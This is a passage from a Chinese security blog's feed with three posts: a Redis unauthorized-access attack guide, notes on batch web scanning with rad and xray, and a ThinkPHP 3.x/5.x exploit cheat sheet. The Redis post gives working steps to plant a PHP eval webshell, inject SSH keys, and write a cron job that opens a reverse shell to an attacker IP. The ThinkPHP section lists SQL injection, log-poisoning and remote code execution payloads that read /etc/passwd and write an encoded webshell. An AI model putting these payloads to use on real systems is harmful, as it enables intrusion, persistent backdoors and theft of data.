/usr/bin/docker-compose</span><br><span class="line">chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p>3.卸载docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker </span><br><span class="line">yum -y remove docker-ce</span><br><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">在我们购买vps或者换服务器，要常常搭建环境，如python、go、java等，以及基础工具，持续更新~~</summary>
    
    
    
    <category term="vps环境" scheme="https://fz1lin.com/categories/vps%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="vps" scheme="https://fz1lin.com/tags/vps/"/>
    
    <category term="环境" scheme="https://fz1lin.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问</title>
    <link href="https://fz1lin.com/2022/1972078239/"/>
    <id>https://fz1lin.com/2022/1972078239/</id>
    <published>2022-02-15T12:53:52.000Z</published>
    <updated>2022-04-07T07:00:47.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h1><p>总结</p><ul><li>写入 webshell</li><li>上传 SSH 公钥获得 SSH 登录权限</li><li>通过 crontab 反弹 shell</li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>redis 绑定端口 6379，且任意IP能访问，无密码直接登录 redis，登录需要在本地安装redis</p><p>本地安装 redis</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzvf redis-2.8.17.tar.gz </span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line">cd ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>测试未授权访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标IP -p 6379</span><br></pre></td></tr></table></figure><h2 id="redis-写入-webshell"><a href="#redis-写入-webshell" class="headerlink" title="redis 写入 webshell"></a>redis 写入 webshell</h2><p>利用条件</p><p>存在未授权访问漏洞，并登录redis，需要知道 web 服务器目录，并有增删改查的权限</p><blockquote><p> web服务器目录，需要自己根据获取路径更改</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标IP -p 6379</span><br><span class="line">config set dir /var/www/html/         # web服务器目录，替换</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="redis-写入-SSH"><a href="#redis-写入-SSH" class="headerlink" title="redis 写入 SSH"></a>redis 写入 SSH</h2><p>利用条件</p><p>存在未授权访问漏洞，并登录redis，.ssh目录有写入的权限</p><p>原理</p><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。</p><p>攻击机 </p><p>生成 SSH 密钥，导入key.txt，再把key.txt写入redis 服务器中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 目标IP -x set xxx</span><br></pre></td></tr></table></figure><p>登录 redis 写入ssh，文件名为 auth_keys</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标IP</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename auth_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>测试登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 目标IP</span><br></pre></td></tr></table></figure><h2 id="redis-写入计划任务-获取shell"><a href="#redis-写入计划任务-获取shell" class="headerlink" title="redis 写入计划任务 获取shell"></a>redis 写入计划任务 获取shell</h2><p>数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell</p><p>攻击机上监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure><p>登录目标网站</p><blockquote><p>根据不同类型的Linux需要更改路径</p><p>Centos的定时任务文件在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/</span><br></pre></td></tr></table></figure><p>Ubuntu定时任务文件在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标IP</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机IP/5555 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>稍等片刻，即可反弹</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li>密码验证</li><li>降权运⾏</li><li>限制 ip / 修改端⼝</li></ul><p><a href="https://www.runoob.com/redis/redis-install.html">https://www.runoob.com/redis/redis-install.html</a></p>]]></content>
    
    
    <summary type="html">redis 6379 打点思路</summary>
    
    
    
    <category term="红队打点" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/"/>
    
    
    <category term="Redis" scheme="https://fz1lin.com/tags/Redis/"/>
    
    <category term="未授权访问" scheme="https://fz1lin.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>rad+xray在Linux运行的踩坑记录</title>
    <link href="https://fz1lin.com/2022/794027888/"/>
    <id>https://fz1lin.com/2022/794027888/</id>
    <published>2022-02-24T12:44:31.000Z</published>
    <updated>2022-04-01T07:36:31.917Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-安装-xray-和-rad"><a href="#0x01-安装-xray-和-rad" class="headerlink" title="0x01 安装 xray 和 rad"></a>0x01 安装 xray 和 rad</h2><p>xray <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p><p>rad <a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></p><p>安装就不用多说了，安装Linux版的就行了</p><h2 id="0x02-运行脚本"><a href="#0x02-运行脚本" class="headerlink" title="0x02 运行脚本"></a>0x02 运行脚本</h2><p>脚本介绍：rad+xray 融合，探测批量目标</p><p>这个脚本是在 window下运行的，所以你要把xray.exe该成你Linux版xray的名字</p><p>根据你自己需要选择即可</p><p><a href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a></p><p>运行脚本会发现出现错误，no chrome found，因为 rad 运行需要 chrome 浏览器，所以要安装chrome浏览器</p><p>防脚本丢失-将原文贴过来了（如有侵权请邮箱联系我删除）。</p><h3 id="社区版用户"><a href="#社区版用户" class="headerlink" title="社区版用户"></a>社区版用户</h3><p>url一行一个放url.txt中，和rad放同文件夹</p><p>xray开启监听，</p><p>./xray webscan –listen 127.0.0.1:7777 –html-output report__datetime__.html</p><p>运行py</p><p>python3 rad+xray.py</p><p>注意：单个任务结束后会kill所有的chrome进程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">data1</span>):</span></span><br><span class="line">target = data1</span><br><span class="line"><span class="built_in">print</span>(target + <span class="string">&quot; Start Crawling&quot;</span>)</span><br><span class="line">cmd = [<span class="string">&quot;./rad&quot;</span>,<span class="string">&quot;-t&quot;</span>,target,<span class="string">&quot;--auto-index&quot;</span>, <span class="string">&quot;--http-proxy&quot;</span>, <span class="string">&quot;127.0.0.1:7777&quot;</span>, <span class="string">&quot;--no-banner&quot;</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">output = subprocess.check_output(cmd, timeout=<span class="number">3600</span>)</span><br><span class="line"><span class="built_in">print</span>(output.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="comment">#print(e)</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">sysstr = platform.system()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> file.readlines():</span><br><span class="line">data1=text.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main(data1)</span><br><span class="line"><span class="built_in">print</span>(data1 + <span class="string">&quot; Finish&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#清除多余浏览器进程</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span>(sysstr ==<span class="string">&quot;Windows&quot;</span>):</span><br><span class="line">os.system(<span class="string">&quot;taskkill /f /IM chrome*&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span>(sysstr ==<span class="string">&quot;Linux&quot;</span>):</span><br><span class="line">os.system(<span class="string">&quot;ps aux | awk &#x27;/chrome/ &#123; print $2 &#125; &#x27; | xargs kill -9&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="高级版用户"><a href="#高级版用户" class="headerlink" title="高级版用户"></a>高级版用户</h3><p>url一行一个放url.txt中</p><p>browserscan.py和xray.exe和rad.exe放同一文件夹</p><p>运行py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 browserscan.py</span><br><span class="line"><span class="comment"># 如果是vps，可以使用</span></span><br><span class="line">nohup python3 browerscan.py &amp;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">data1</span>):</span></span><br><span class="line">target = data1</span><br><span class="line">cmd = [<span class="string">&quot;./xray.exe&quot;</span>,<span class="string">&quot;webscan&quot;</span>,<span class="string">&quot;--browser-crawler&quot;</span>,target,<span class="string">&quot;--html-output&quot;</span> ,<span class="string">&quot;report__datetime__.html&quot;</span>]</span><br><span class="line">rsp=subprocess.Popen(cmd)</span><br><span class="line">output, error = rsp.communicate()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> file.readlines():</span><br><span class="line">data1=text.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main(data1)</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>centos7 安装浏览器</p><p>先在本地下载对应版本的包，然后上传到 Linux上</p><p><a href="https://www.google.com/chrome/?platform=linux">https://www.google.com/chrome/?platform=linux</a></p><p><img src="/2022/794027888/image-20220224112228592.png" alt="image-20220224112228592"> </p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装Chrome</span><br><span class="line"><span class="comment">#直接通过yum来安装rpm包</span></span><br><span class="line">yum install -y google-chrome-stable_current_x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装glib2</span></span><br><span class="line">yum update glib2 -y </span><br><span class="line"></span><br><span class="line"><span class="comment">#卸载Google浏览器</span></span><br><span class="line">yum autoremove -y google-chrome</span><br><span class="line"></span><br><span class="line">安装完成后的目录，安装完成chrome的目录在 /opt/google/chrome。</span><br><span class="line">测试安装</span><br><span class="line">/opt/google/chrome --version</span><br></pre></td></tr></table></figure><p>再次运行xray你会发现又出现错误了，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[launcher] Failed to get the debug url: [0224/025251.434358:ERROR:zygote_host_impl_linux.cc(90)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180.</span><br></pre></td></tr></table></figure><p>原因是chrome的沙箱问题，不能以root用户运行。</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p>修改 /usr/bin/ 目录下的 google-chrome 配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/bin/google-chrome</span><br><span class="line"></span><br><span class="line">找到 exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; 将其注释掉</span><br><span class="line">并添加一行 exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --user-data-dir --no-sandbox</span><br></pre></td></tr></table></figure><p>重新运行xray脚本即可</p><h3 id="后台运行注意事项"><a href="#后台运行注意事项" class="headerlink" title="后台运行注意事项"></a>后台运行注意事项</h3><p>如果不使用此命令，如果断开 shell 终端，任务会结束</p><p>具体的可以参考这个 <a href="https://www.runoob.com/linux/linux-comm-nohup.html">nohup</a></p><p>nohup基础使用</p><p>1.后台运行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="keyword">python3</span> browerscan.<span class="keyword">py</span> &amp;</span><br></pre></td></tr></table></figure><p>2.查看项目生成的数据</p><blockquote><p>动态显示数据进程</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">tail</span> -f nohup.txt</span><br></pre></td></tr></table></figure><p>3.查看后台运行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> <span class="keyword">python3</span></span><br></pre></td></tr></table></figure><p>4.杀死后台</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> <span class="keyword">python3</span> </span><br><span class="line">kill <span class="keyword">python3</span>的UID</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a></p><p><a href="https://blog.csdn.net/yelllowcong/article/details/80159963">https://blog.csdn.net/yelllowcong/article/details/80159963</a></p><p><a href="https://blog.csdn.net/weixin_42250835/article/details/119983347">https://blog.csdn.net/weixin_42250835/article/details/119983347</a></p>]]></content>
    
    
    <summary type="html">在工作中批量处理遇到的问题，rad+xray在Linux下运行的记录</summary>
    
    
    
    <category term="踩坑记录" scheme="https://fz1lin.com/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="环境" scheme="https://fz1lin.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
    <category term="Linux" scheme="https://fz1lin.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 3.x ，5.x 漏洞速查</title>
    <link href="https://fz1lin.com/2022/429639226/"/>
    <id>https://fz1lin.com/2022/429639226/</id>
    <published>2022-02-20T08:40:53.000Z</published>
    <updated>2022-02-20T08:56:46.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP-版本探测"><a href="#ThinkPHP-版本探测" class="headerlink" title="ThinkPHP 版本探测"></a>ThinkPHP 版本探测</h2><p>使用浏览器插件判断是 ThinkPHP </p><p><img src="/2022/429639226/image-20220218132319732.png" alt="image-20220218132319732"> </p><p>提交任意字符，会爆出框架版本</p><p> <img src="/2022/429639226/image-20220218134539894.png" alt="image-20220218134539894"> </p><p>如果版本隐藏，可以考虑盲打。使用payload即可，作为打点漏洞，需要知道，该漏洞是否有利用面，也就是进一步的深入，能否获取内网获取权限。</p><h2 id="ThinkPHP-3-2-3-漏洞"><a href="#ThinkPHP-3-2-3-漏洞" class="headerlink" title="ThinkPHP 3.2.3 漏洞"></a>ThinkPHP 3.2.3 漏洞</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/ThinkPHP/</span>POC</span><br></pre></td></tr></table></figure><p>order by 注入漏洞</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">order</span>[updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>update 注入漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">money</span>[]=<span class="number">1123</span>&amp;user=liao&amp;id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span>%<span class="number">20</span>and%<span class="number">20</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select%<span class="number">20</span>user()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="3-2-x-RCE-漏洞"><a href="#3-2-x-RCE-漏洞" class="headerlink" title="3.2.x  RCE 漏洞"></a>3.2.x  RCE 漏洞</h3><p>关闭 debug</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>读取日志文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\C</span>ommon<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21_06_30.log</span><br></pre></td></tr></table></figure><p>开启debug</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>文件默认路径</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\H</span>ome<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Home/21_06_30.log</span><br></pre></td></tr></table></figure><p>传入恶意文件，传入文件地址</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./test.txt</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;info</span>[<span class="string">_filename</span>]=.\</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-5-x-漏洞"><a href="#ThinkPHP-5-x-漏洞" class="headerlink" title="ThinkPHP 5.x 漏洞"></a>ThinkPHP 5.x 漏洞</h2><p>tp框架系列中，5.0.x 跟 5.1.x 中，各个系列里的poc是几乎为通用的<br>5.0.1中某个poc在5.0.3中也是可以用的，也就是说当我们碰到5.0.8的时候，可以尝试用5.0.1<br>或 5.0.5等 5.0.x 系列的poc去尝试使用，5.1.x 系列同理</p><p>漏洞成因</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">路由控制不严谨，默认不开启强制路由，从而可以任意调用Thinkphp的类库</span><br><span class="line"></span><br><span class="line">主要有两种方法，</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="built_in">Request</span>中的变量覆盖导致RCE</span><br><span class="line"><span class="number">2.</span>路由控制不严谨导致的RCE</span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-1"><a href="#Thinkphp-5-0-1" class="headerlink" title="Thinkphp 5.0.1"></a>Thinkphp 5.0.1</h3><p>（1）判断是否存在漏洞</p><p>poc1</p><pre><code>http://wwww.com/publics=phpinfo()&amp;_method=__construct&amp;filter=assert_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1</code></pre><p>poc2</p><pre><code>http:/xxxx.com/?s=index/index/indexs=ipconfig&amp;_mehthod=__construct$method=&amp;filter[]=system</code></pre><p>（2）深入利用</p><p>使用post提交</p><p>1、使用assert函数</p><pre><code>s=phpinfo()&amp;_method=__construct&amp;filter=assert</code></pre><p>2、include函数，可以根据此函数查看一些文件及其配置</p><pre><code>s=include(&quot;/etc/passwd&quot;)&amp;_method=__construct&amp;filter=assert</code></pre><p>3、file_put_contents函数，可以直接写入文件</p><pre><code>s=file_put_contents(&#39;/data/wwwroot/test.com/application/index/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert</code></pre><p>4、读取文件</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../application/.htaccesss=include(&quot;../application/.htaccess&quot;)&amp;_method=__construct&amp;filter=assert//ps:如果不加.. 